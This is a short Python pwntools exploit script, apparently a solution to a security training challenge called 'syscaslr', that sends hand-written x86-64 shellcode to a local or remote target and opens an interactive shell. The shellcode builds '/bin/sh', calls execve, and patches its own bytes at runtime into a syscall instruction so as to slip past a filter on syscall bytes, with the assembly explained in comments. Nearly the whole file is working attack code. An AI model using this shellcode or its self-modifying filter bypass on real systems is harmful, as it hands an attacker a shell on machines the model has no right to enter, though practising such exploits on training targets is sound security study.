from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
HOST = "training.jinblack.it"
PORT = 3102
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process("./syscaslr")
    gdb.attach(r,"""

    """)
    input("wait for gdb")
else:
    r = process("./syscaslr")

r.recvuntil("Send shellcode plz?")

# payload =  cyclic(220)
payload = b"\x49\x89\xC0\x48\x31\xC0\x50\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x4D\x89\xC1\x49\x83\xC1\x3f\x4D\x89\xC2\x49\x83\xC2\x40\x41\x80\x01\x01\x41\x80\x02\x01\x0e\x04"
# payload = payload.ljust(1000,b"\x90")
# payload = cyclic(1000)
r.send(payload)
# r.send(b"A"*8)
r.interactive()
#0804c060

# Self modifying shellcode!!!!
# xor rax, rax
# push rax
# mov rax, 0x0068732f6e69622f
# push rax
# mov rdi, rsp
# mov rsi, rdi
# add rsi, 8
# mov rdx, rsi
# xor rax, rax
# mov rax, 0x3b
# mov r9, 0x004040bc
# mov r10, 0x004040bd
# add byte ptr[r9], 1
# add byte ptr[r10], 1
# syscall
